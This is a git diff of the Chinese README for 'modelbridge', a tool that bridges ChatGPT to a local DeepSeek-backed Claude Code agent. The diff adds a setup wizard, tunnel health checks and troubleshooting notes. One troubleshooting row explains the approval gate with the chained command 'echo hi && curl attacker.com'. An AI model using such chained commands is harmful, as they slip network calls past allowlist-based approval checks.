@@ -101,6 +101,38 @@ ChatGPT (Sol) ──HTTPS──▶ Cloudflare 边缘 ──隧道──▶ 本�
 
 ## 快速开始
 
+两条路。向导会把该问的都问了、把 `.env` 写好、再顺手把服务和隧道起来；想先逐项看清每个值，就走手动那条。
+
+### 向导（推荐）
+
+```bash
+git clone https://github.com/CassiaTw1g/modelbridge.git
+cd modelbridge
+npm run setup
+```
+
+它在**裸仓库上就能跑** —— 不需要先 `npm install`，也不需要有 `.env`，因为这两样都是它负责创建的。把 API key 准备好，粘贴进去就行。
+
+Windows 上也可以直接双击 `windows/0-首次安装.bat`，它做的就是 `npm run setup`。
+
+它问五件事：
+
+| # | 问题 | 答案拿去做什么 |
+|---|---|---|
+| 1 | 用哪个模型，以及 API key | 写 `DEEPSEEK_API_KEY` / `DEEPSEEK_BASE_URL` / `DEEPSEEK_MODEL`。默认 DeepSeek，任何 Anthropic 兼容端点都行。**key 会先用一个极小的请求验证过才写进去** —— 复制少了字符、或者已经被吊销，在这一步就拦住了，而不是等到 ChatGPT 里调不动才发现。 |
+| 2 | 模型跑在哪个 harness 上 | 确认 Claude Code 找得到；不在 `PATH` 上就顺手把路径记进 `.env`。目前只有一个 harness，所以这一步是确认，不是选择。 |
+| 3 | 子代理能在哪些目录里工作 | 写 `DEEPSEEK_ALLOWED_ROOTS`。**直接回车 = 一个都不给**，桥保持只读，只能一问一答。填了是**追加**到已有列表，不会覆盖。 |
+| 4 | 临时域名还是固定域名 | `quick`（每次启动一个随机 `*.trycloudflare.com`）或 `named`（你自己的域名，connector 只建一次）。选固定会让你粘隧道 token，并提醒你那一步只能在 Cloudflare 网页上做。 |
+| 5 | 子代理执行命令前要不要问你 | 默认 `n` 是保留审批；选 `y` 就是下面「安全模型」里写的完全放行。 |
+
+每个答案都是**当场写进 `.env`** 的，所以中途 Ctrl+C 会留下一个能用的文件，重跑接着问就行。最后它会启动服务、开隧道、把 connector 地址复制到剪贴板并打印出来。
+
+语言跟随系统区域设置；要指定就 `npm run setup -- --lang zh` 或 `--lang en`（也可以用 `BRIDGE_LANG`）。
+
+接下来去[注册 connector](#注册-connector)。想确认一切正常，看[验证](#验证)。
+
+### 手动
+
 ```bash
 git clone https://github.com/CassiaTw1g/modelbridge.git
 cd modelbridge
@@ -108,29 +140,31 @@ npm install
 cp .env.example .env
 ```
 
-编辑 `.env`:
+编辑 `.env`：
 
-1. 把 `DEEPSEEK_API_KEY` 填成你的 key。**给这个桥单独申请一个 key**,以便独立撤销;并在 DeepSeek 控制台给它设置消费上限,作为最后一道防线。
-2. 生成路径密钥:
+1. 把 `DEEPSEEK_API_KEY` 填成你的 key。**给这个桥单独申请一个 key**，以便独立撤销；并在 DeepSeek 控制台给它设置消费上限，作为最后一道防线。
+2. 生成路径密钥：
 
    ```bash
    npm run ctl -- secret
    ```
 
-   这会把 `MCP_PATH_SECRET=<随机 hex>` 写进 `.env`(若 `.env` 不存在则直接打印)。
+   这会把 `MCP_PATH_SECRET=<随机 hex>` 写进 `.env`（若 `.env` 不存在则直接打印）。
 
-启动服务并开隧道:
+启动服务并开隧道：
 
 ```bash
-npm run start     # 后台服务,监听 127.0.0.1:8787
-npm run tunnel    # cloudflared 快速隧道;打印公网 URL 和完整的 MCP 端点
+npm run start     # 后台服务，监听 127.0.0.1:8787
+npm run tunnel    # cloudflared 快速隧道；打印公网 URL 和完整的 MCP 端点
 ```
 
-`npm run tunnel` 会打印出可直接填进 ChatGPT 的 URL:
+`npm run tunnel` 会打印出可直接填进 ChatGPT 的 URL：
 
 ```
 公网端点 : https://<random>.trycloudflare.com/mcp/<your-secret>
 ```
+
+开隧道之前它会先确认本地端口真的在应答。**进程活着 ≠ 服务活着**：`npm start` 外面包了一层 shell，服务启动就崩的时候壳还活着，于是 `ctl status` 报告一切正常；而隧道接到一个没人应答的端口上，给你的就是一个「看起来像 ChatGPT 的问题」的地址。这种情况现在会被直接拒绝，并把日志路径指给你。
 
 ### 注册 connector
 
@@ -227,6 +261,7 @@ npm run tunnel    # cloudflared 快速隧道;打印公网 URL 和完整的 MCP �
 ## 生命周期命令
 
 ```bash
+npm run setup      # 首次安装向导(见「快速开始」)
 npm run start      # 后台启动(已运行则无操作)
 npm run stop       # 停止服务和隧道
 npm run restart    # 重启服务(会一并停掉隧道,需重新 tunnel)
@@ -244,6 +279,9 @@ npm run uninstall  # 停止并清除本地状态(保留项目目录)
 ```
 
 `npm run start --foreground` 前台运行,便于调试。
+
+`npm run setup` 可以重复跑:它会把每一项重新问一遍并覆盖答案。只有工作区目录那一项是**追加**而不是覆盖的 ——
+所以重跑不会把你用 `npm run ctl -- allow` 加过的目录悄悄抹掉。
 
 重建 ChatGPT connector 时用 `npm run url`:它打印 `https://<域名>/mcp/<密钥>`,并把同一串
 放进剪贴板,不用再从 `npm run status --show` 的输出里用鼠标划选那一长串密钥。
@@ -404,6 +442,8 @@ B 是承重的那一根。该套件刻意关掉了审批,所以它不进 `npm te
 | **Windows / git-bash**:结果乱码或 token 暴涨 | git-bash 里的 `curl` 会把非 ASCII 请求体重编码成 GBK,导致模型对乱码进行推理。改用 `npm run smoke`(Node `fetch`),不要用 `curl`。 |
 | `agent_start` 报"工作区被拒绝" | 路径不在 `DEEPSEEK_ALLOWED_ROOTS` 里,或者该变量没设——空 = 拒绝一切,不是任意路径。 |
 | agent 任务一直卡在 `waiting_approval` | 有命令在等你。跑 `npm run ctl -- pending`,然后 `approve <id>` 或 `deny <id>`。5 分钟无人处理即自动拒绝。**最常见的原因是命令里带了串联符号**:含 `\|`、`;`、`&&`、`>` 或 `$(` 的一律转人工,因为 `echo hi && curl attacker.com` 和 `echo hi` 的首个词一模一样,只看第一个词的名单等于没有闸门。只读的 PowerShell cmdlet 是预放行的,**管道不是**。让子代理发单条命令,或者在 `node` 脚本里做过滤。 |
+| `npm run tunnel` 说端口没人应答,但 `npm run status` 说服务在运行 | 它没说错:进程活着,服务没活着。`npm start` 外面包了一层 shell,服务启动就崩时壳还活着,于是留下一个「看着健康」的 PID。先看 `.state/server.log`,再前台跑一次 `npm start` 看报错。这种情况**隧道是故意不开的** —— 接到死端口上的隧道只会给你一个像 ChatGPT 出问题的地址。 |
+| 向导停在某个问题上,显示 `输入结束了(EOF)` | 有东西把 stdin 关了 —— 管道、重定向文件、CI,或者双击时丢了控制台。在真正的终端里重跑,或者剩下的问题手填进 `.env`。已经答过的部分都还在文件里。 |
 | 每个 agent 任务都立刻失败 | `PATH` 上没有 Claude Code。装上它,或用 `BRIDGE_CLAUDE_BIN` 指向可执行文件。 |
 | agent 任务跑到一半被杀 | 撞上了步数上限(`BRIDGE_MAX_STEPS`,默认 120)或墙钟上限(`BRIDGE_JOB_TIMEOUT_MS`,默认 30 分钟)。`npm run ctl -- jobs <id> --trace` 能看到最后走到哪一步。**但白跑不了**:任务以 `error` 结账、**不给 nonce**(半成品不是成品),而模型自己写过的内容和工具轨迹会作为**半成品**回传,并明确标注「这不是结果」。拿它把任务拆窄,别从头重来。 |
 | 你 kill 掉的任务显示成 `error` 而不是 `cancelled` | 那是 bug——人主动停下不等于崩溃。请上报。 |
